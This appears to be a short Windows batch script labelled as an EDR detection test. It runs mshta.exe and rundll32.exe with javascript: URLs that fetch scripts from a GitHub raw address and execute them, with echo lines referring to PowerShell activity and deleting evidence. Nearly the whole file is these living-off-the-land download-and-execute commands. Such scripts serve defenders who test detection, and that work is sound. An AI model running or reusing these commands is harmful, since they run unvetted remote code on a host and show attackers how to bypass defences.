#echo EDR test powershell activity
mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest2-POV.bat")).Exec();close()
timeout 5
echo EDR test delete evidence
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/srmstest/testdetection/main/edrtest3-POV").Exec();close()
